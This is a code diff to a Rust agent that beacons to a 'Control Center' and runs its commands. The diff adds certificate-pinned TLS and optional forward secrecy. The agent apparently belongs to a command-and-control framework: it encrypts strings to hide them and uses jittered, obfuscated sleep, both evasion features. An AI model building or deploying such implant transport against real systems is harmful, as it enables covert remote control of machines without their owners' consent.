@@ -14,13 +14,25 @@
 //!
 //! 1. `ORCHESTRA_SECRET` runtime environment variable.
 //! 2. `ORCHESTRA_C_SECRET` baked in at compile time.
+//!
+//! # TLS verification
+//!
+//! When `ORCHESTRA_C_CERT_FP` is baked in at build time the agent pins the
+//! server certificate by its SHA-256 fingerprint (hex).  Without a fingerprint
+//! the agent uses the system's native root CA store, which works for servers
+//! with publicly-trusted certificates.  Production deployments should always
+//! use certificate pinning.
 
 use anyhow::{anyhow, Result};
-use common::{Message, Transport};
+use common::{CryptoSession, Message, Transport};
+use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 use log::{error, info, warn};
+use rustls::ClientConfig;
 use sysinfo::System;
+use std::sync::Arc;
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
+use tokio_rustls::TlsConnector;
 use crate::obfuscated_sleep::calculate_jittered_sleep;
 use uuid::Uuid;
 
@@ -29,15 +41,12 @@ const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
 const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
 const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");
 
-
 const MAX_BACKOFF_SECS: u64 = 64;
 
 /// Resolve the server address: runtime env var beats compile-time constant.
 pub fn resolve_addr() -> Option<String> {
     #[cfg(debug_assertions)]
     {
-        // enc_str! returns [u8; N]; convert to &str before passing to env::var
-        // which requires AsRef<OsStr> (B-02 fix).
         let raw = string_crypt::enc_str!("ORCHESTRA_C");
         let key = std::str::from_utf8(&raw).unwrap_or("").trim_end_matches('\0');
         if let Ok(v) = std::env::var(key) { return Some(v); }
@@ -56,22 +65,75 @@ pub fn resolve_secret() -> Option<String> {
     BAKED_SECRET.map(str::to_string)
 }
 
+/// Resolve the TLS certificate fingerprint (hex SHA-256).
+pub fn resolve_cert_fp() -> Option<String> {
+    BAKED_CERT_FP.map(str::to_string)
+}
+
+/// Build a rustls `ClientConfig` for connecting to the Control Center.
+///
+/// When `cert_fp` is provided the server certificate is verified by its
+/// SHA-256 fingerprint (strict pinning).  Otherwise the system's native root
+/// CA store is used.
+fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
+    if let Some(fp) = cert_fp {
+        let verifier = PinnedCertVerifier::from_hex(fp)?;
+        let cfg = ClientConfig::builder()
+            .dangerous()
+            .with_custom_certificate_verifier(Arc::new(verifier))
+            .with_no_client_auth();
+        return Ok(cfg);
+    }
+
+    // No fingerprint — fall back to native root store.
+    let mut roots = rustls::RootCertStore::empty();
+    let native = rustls_native_certs::load_native_certs();
+    if !native.errors.is_empty() {
+        warn!("outbound-c: {} errors loading native root certs (continuing)", native.errors.len());
+    }
+    for cert in native.certs {
+        roots.add(cert).ok();
+    }
+    Ok(ClientConfig::builder()
+        .with_root_certificates(roots)
+        .with_no_client_auth())
+}
+
 /// Connect once, run the agent command loop until transport error or
 /// clean shutdown. Returns `Ok(())` on a clean `Shutdown` command.
-async fn connect_once(addr: &str, secret: &str, agent_id: &str) -> Result<()> {
+async fn connect_once(addr: &str, secret: &str, agent_id: &str, cert_fp: Option<&str>) -> Result<()> {
     info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");
 
-    let stream = TcpStream::connect(addr).await?;
-    stream.set_nodelay(true)?;
+    let tcp = TcpStream::connect(addr).await?;
+    tcp.set_nodelay(true)?;
 
-    let session = common::CryptoSession::from_shared_secret(secret.as_bytes());
-    
-    let mut tls_transport = common::normalized_transport::NormalizedTransport::connect(
-        stream, session, common::normalized_transport::Role::Client
-    ).await?;
+    // Establish a real TLS connection to the Control Center.
+    let tls_cfg = build_tls_client_config(cert_fp)?;
+    let connector = TlsConnector::from(Arc::new(tls_cfg));
+
+    // Extract hostname from addr (host:port) for TLS SNI.
+    let host = addr.split(':').next().unwrap_or(addr);
+    let server_name = rustls::pki_types::ServerName::try_from(host.to_owned())
+        .map_err(|e| anyhow!("invalid server address for TLS SNI '{host}': {e}"))?;
+
+    let mut tls_stream = connector.connect(server_name, tcp).await?;
+    info!("outbound-c: TLS handshake complete");
+
+    // When forward-secrecy is enabled, derive a per-session key via X25519 ECDH.
+    #[cfg(feature = "forward-secrecy")]
+    let session = common::forward_secrecy::negotiate_session_key(
+        &mut tls_stream,
+        secret.as_bytes(),
+        true, // client sends its public key first
+    )
+    .await?;
+    #[cfg(not(feature = "forward-secrecy"))]
+    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+
+    let mut transport: Box<dyn Transport + Send> = Box::new(TlsTransport::new(tls_stream, session));
 
     let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
-    tls_transport
+    transport
         .send(Message::Heartbeat {
             timestamp: std::time::SystemTime::now()
                 .duration_since(std::time::UNIX_EPOCH)
@@ -84,8 +146,7 @@ async fn connect_once(addr: &str, secret: &str, agent_id: &str) -> Result<()> {
 
     info!("outbound-c: registered with Control Center, running command loop");
 
-    let boxed: Box<dyn common::Transport + Send> = Box::new(tls_transport);
-    let mut agent = crate::Agent::new(boxed)?;
+    let mut agent = crate::Agent::new(transport)?;
     agent.run().await
 }
 
@@ -108,6 +169,14 @@ pub async fn run_forever() -> Result<()> {
         )
     })?;
 
+    let cert_fp = resolve_cert_fp();
+    if cert_fp.is_none() {
+        warn!(
+            "outbound-c: no TLS certificate fingerprint configured. \
+             Production deployments should bake in ORCHESTRA_C_CERT_FP for strict pinning."
+        );
+    }
+
     // Generate a stable agent ID for this process lifetime so the server
     // recognises reconnects as the same agent.
     let agent_id = format!(
@@ -118,7 +187,7 @@ pub async fn run_forever() -> Result<()> {
 
     let mut backoff = Duration::from_secs(1);
     loop {
-        match connect_once(&addr, &secret, &agent_id).await {
+        match connect_once(&addr, &secret, &agent_id, cert_fp.as_deref()).await {
             Ok(()) => {
                 // Clean shutdown — respect it, do not reconnect.
                 info!("outbound-c: received Shutdown from Control Center, exiting.");
